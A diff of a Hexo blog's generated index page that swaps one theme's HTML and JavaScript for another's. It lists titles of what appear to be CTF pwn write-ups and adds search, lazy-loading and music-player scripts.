-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
-    </div>
-  </div>
-
-  </div>
-  
-  <div class="widget-box">
-  	
-  <div class="widget-box">
-    <h3 class="widget-title-post">recent_posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/26/FUZZ/xpdf/">xpdf</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/20/trick/">trick</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/20/trick/trick/">trick</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/18/qwnt2024/">qwnt2024</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/13/%E6%B2%99%E7%AE%B1/%E6%B2%99%E7%AE%B1/">沙箱</a>
-          </li>
-        
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://github.com/degial/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
       </ul>
     </div>
   </div>
+</header>
 
-  </div>
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"ACTF_2019_OneRepeater","path":"/posts/319d974/"},{"title":"ACTF_2019_message","path":"/posts/f5d1b033/"},{"title":"GUESS","path":"/posts/c587cd26/"},{"title":"NewStar","path":"/posts/d23e595a/"},{"title":"SWPUCTF_2019_p1KkHeap","path":"/posts/a25249b0/"},{"title":"SWPUCTF_2019_login","path":"/posts/61db3fed/"},{"title":"b00ks","path":"/posts/be955ceb/"},{"title":"b0verfl0w","path":"/posts/b656e51/"},{"title":"bad","path":"/posts/822b39fb/"},{"title":"babyheap_0ctf_2017","path":"/posts/1a2f921f/"},{"title":"bbctf_2020_write","path":"/posts/75171fcc/"},{"title":"ciscn_2019_c_3","path":"/posts/7d6af77/"},{"title":"ciscn_2019_c_5","path":"/posts/eeb50a42/"},{"title":"ciscn_2019_es_1","path":"/posts/90ce1974/"},{"title":"checkin","path":"/posts/e1631c91/"},{"title":"ciscn_2019_es_7","path":"/posts/79adbc41/"},{"title":"ciscn_final_2","path":"/posts/9a3dca0e/"},{"title":"ciscn_pwn","path":"/posts/344ab8fb/"},{"title":"ciscn_final_5","path":"/posts/4595fad/"},{"title":"easyshell","path":"/posts/9ea1a33f/"},{"title":"freenote_x64","path":"/posts/231495d9/"},{"title":"glibc","path":"/posts/58b6dd93/"},{"title":"gostack","path":"/posts/ad559ced/"},{"title":"heap","path":"/posts/bd2922e1/"},{"title":"hitcon2014_stkof","path":"/posts/78860fdf/"},{"title":"200~house_of_force","path":"/posts/a8db7475/"},{"title":"inndy_rop","path":"/posts/19fdcc0c/"},{"title":"","path":"/posts/0/"},{"title":"jiandan_pwn1","path":"/posts/595198b9/"},{"title":"heapcreator","path":"/posts/707c38cf/"},{"title":"lctf2016_pwn200","path":"/posts/6f5f7bb7/"},{"title":"level4","path":"/posts/7792b02a/"},{"title":"login","path":"/posts/aa08cb10/"},{"title":"mergeheap","path":"/posts/709727a2/"},{"title":"metasequoia_2020_samsara","path":"/posts/dff3306c/"},{"title":"note2","path":"/posts/c0d78a/"},{"title":"","path":"/posts/0/"},{"title":"python课设","path":"/posts/5eca8ee9/"},{"title":"overlapping_chunks","path":"/posts/37a70f1c/"},{"title":"qwnt2024","path":"/posts/a036fd99/"},{"title":"roarctf_2019_easypwn","path":"/posts/29aca647/"},{"title":"sctf2019_easy_heap","path":"/posts/b5a0cf5/"},{"title":"sctf_2019_easy_heap","path":"/posts/afe33925/"},{"title":"sleepyHolder_hitcon_2016","path":"/posts/b1e92899/"},{"title":"starctf_2019_girlfriend","path":"/posts/2672e039/"},{"title":"STKOF","path":"/posts/696f0fbd/"},{"title":"trick","path":"/posts/d8f0a91e/"},{"title":"stdout","path":"/posts/c2c94c1c/"},{"title":"","path":"/posts/0/"},{"title":"武功论剑","path":"/posts/6ca732a0/"},{"title":"解决libc6软件包和libc6-dev不匹配的问题","path":"/posts/24332419/"},{"title":"xpdf","path":"/posts/7e7e55f1/"},{"title":"CVE-2020-8423","path":"/posts/24932e9/"},{"title":"trick","path":"/posts/d8f0a91e/"},{"title":"沙箱","path":"/posts/fbdf783e/"},{"title":"","path":"/posts/0/"},{"title":"pstack","path":"/posts/3d6a2015/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">Cola.</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">中二</span>
+          <span class="main-left--tag">宅</span>
+        </div>
+      </div>
+    </div>
   
-</aside>
+    <div>
+      <div class="main-left--motto">
+        <p>“花有重开日，人无再少年”</p>
+        <p>“一个简单普通的男孩”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a href="https://github.com/Aizener"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>0</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>2</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>12 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
 
-<!-- <div id="paginator"> -->
-<!--   <a class="extend prev" rel="prev" href="/page/3/"> </a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/5/"> </a> -->
-<!-- </div> -->
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-          tex2jax: {
-            inlineMath: [ ['$','$'], ["\\(","\\)"] ],
-            processEscapes: true
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>57 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1033天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container"><link rel="stylesheet" href="/css/partial/index.css" />
+
+
+
+<div class="index">
+  <div class="index-left">
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="pstack" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/3d6a2015/">pstack </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="ciscn_pwn" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/344ab8fb/">ciscn_pwn </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="heap" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/bd2922e1/">heap </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+  </div>
+  <div class="index-center">
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" data-cover="" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="武功论剑" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/6ca732a0/">武功论剑 </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" data-cover="" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="easyshell" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/9ea1a33f/">easyshell </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+  </div>
+  <div class="index-right">
+    <div class="index-right-wrapper">
+      
+      <ul class="tags" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-NewSar/" rel="tag">ctf-NewSar</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">2024年11月</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">2024年10月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">2024年09月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">2024年07月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">2024年05月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">2024年04月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">2024年03月</a><span class="archive-list-count">20</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">2024年02月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">2024年01月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">2023年12月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">2023年11月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">2023年10月</a><span class="archive-list-count">7</span></li></ul>
+    </div>
+  </div>
+</div>
+
+  <div class="page">
+    <a class="extend prev" rel="prev" href="/page/3/">&lt;</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/5/">&gt;</a>
+  </div>
+
+
+<script>
+  var allImgBoxs = document.querySelectorAll('.index-article--box');
+  var windowHeight = window.innerHeight;
+  var boxs = Array.from(allImgBoxs);
+  var timer = null;
+  boxs.forEach((box, idx) => {
+    if (!window.loadImageSet || !window.loadImageSet.includes(idx)) {
+      box.classList.add('img-loading');
+    } else {
+      const imgDom = box.querySelector('img');
+      imgDom.src = imgDom.dataset.cover;
+    }
+  });
+
+  function scrollFn() {
+    if (timer) {
+      return;
+    }
+    timer = setTimeout(() => {
+      loadImage();
+      timer = null;
+    }, 100)
+  }
+
+  setTimeout(() => {
+    loadImage();
+  }, 100);
+  if (!window.loadedImage) {
+    document.addEventListener('scroll', scrollFn);
+  }
+
+  function loadImage() {
+    const doc = document.documentElement;
+    const scrollTop = doc.scrollTop;
+    if (boxs.every(box => box.loadedImage)) {
+      document.removeEventListener('scroll', scrollFn);
+      window.loadedImage = 1;
+      return;
+    }
+    boxs.forEach((box, idx) => {
+      if (box.loadedImage) {
+        return;
+      }
+      if (box.getBoundingClientRect().top < windowHeight) {
+        const imgDom = box.querySelector('img');
+        imgDom.src = imgDom.dataset.cover;
+        // 图片成功加载
+        imgDom.onload = () => {
+          box.classList.remove('img-loading');
+          box.loadedImage = true;
+          if (!window.loadImageSet) {
+            window.loadImageSet = [];
           }
-        });
-      </script>
+          window.loadImageSet.push(idx);
+        }
+        // 图片加载失败
+        imgDom.onerror = () => {
+          box.classList.remove('img-loading');
+          box.classList.add('img-error');
+          imgDom.src = '/imgs/404.png';
+        }
+      }
+    });
+  }
+</script> </div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello~大噶好。唔系可乐爱宅着，欢迎你们来到我的博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-            tex2jax: {
-              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-            }
-          });
-      </script>
+  <div id="aplayer" class="main-right--music"></div>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-              var all = MathJax.Hub.getAllJax(), i;
-              for(i=0; i < all.length; i += 1) {
-                  all[i].SourceElement().parentNode.className += ' has-jax';
-              }
-          });
-    </script>
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
 
-    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">蜀ICP备2022005384号-1</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"安河桥","artist":"宋冬野","url":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
 
 
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
 
-			</div>
-		</div>
-
-		<div id="bottom-outer">
-			<div id="bottom-inner">
-				Site by your name | 
-				Powered by <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a> |
-				theme <a target="_blank" rel="noopener" href="https://github.com/fireworks99/hexo-theme-PreciousJoy">PreciousJoy</a>
-			</div>
-		</div>
-
-		
-	</div>
-
-
-
-
-
-	
-	<!-- scripts list from theme config.yml -->
-	
-	<script src="/js/jquery-3.5.1.min.js"></script>
-	
-	<script src="/js/PreciousJoy.js"></script>
-	
-	<script src="/js/highlight.pack.js"></script>
-	
-	<script src="/js/jquery.fancybox.min.js"></script>
-	
-	<script src="/js/search.js"></script>
-	
-	<script src="/js/load.js"></script>
-	
-	<script src="/js/jquery.mCustomScrollbar.concat.min.js"></script>
-	
-	<script src="/js/clipboard.min.js"></script>
-	
-	
-
-	<script>hljs.initHighlightingOnLoad();</script>
-
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
 </body>
 </html>
